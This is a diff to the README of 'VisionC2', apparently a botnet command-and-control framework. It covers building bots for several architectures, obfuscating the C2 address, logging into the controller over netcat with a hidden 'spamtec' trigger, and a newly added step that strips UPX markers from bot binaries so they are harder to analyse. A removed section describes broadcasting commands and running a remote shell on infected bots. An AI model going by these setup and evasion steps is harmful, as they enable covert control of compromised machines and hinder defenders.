@@ -28,11 +28,6 @@
 - **Encrypted Communications**: TLS-protected command channels
 - **Resource-Aware Execution**: Minimal footprint with maximum capability
 
-### **Enterprise Command & Control**
-- **Real-Time Bot Management**: Target by botid or broadcast 
-- **Streamlined Ouput**: Psuedo Interactive Shell via !botid !shell <command>
-- **Professional Interface**: Color-coded terminal with dynamic user indicators
-
 ---
 ### 🔐 **Military-Grade Security Stack**
 - **TLS 1.3 Encryption**: State-of-the-art encrypted communications
@@ -92,7 +87,7 @@ cd VisionC2
 # Generate secure certificates
 openssl genrsa -out server.key 4096
 openssl req -new -x509 -sha256 -key server.key -out server.crt -days 365 \
-  -subj "/C=US/O=Security Research/CN=visionc2.local"
+  -subj "/C=US/O=Security Research/CN=visionsecure.local"
 
 # Configure your environment
 cd cnc
@@ -100,8 +95,9 @@ cd cnc
 go run .  # First run creates admin user
 
 # Logging in
-nc 1.1.1.1 955 (this is your server port and address)
-You'll see a blank screen at first type "spamtec" to find login prompt 
+netcat ip port (this is your server port and address)
+You'll see a blank screen at first this is normal
+type "spamtec" to find login prompt 
 ```
 
 ### Bot Deployment
@@ -114,6 +110,10 @@ python3 tools/obfuscate_c2.py "1.2.3.4:443"
 # Build for multiple architectures
 chmod +x build.sh
 ./build.sh
+# Optional remove Upx strings (harder to anaylze, no proof file was packed)
+
+https://github.com/Syn2Much/upx-stripper.git
+python3 noMoreUpx.py bins -v 
 ```
 
 ---
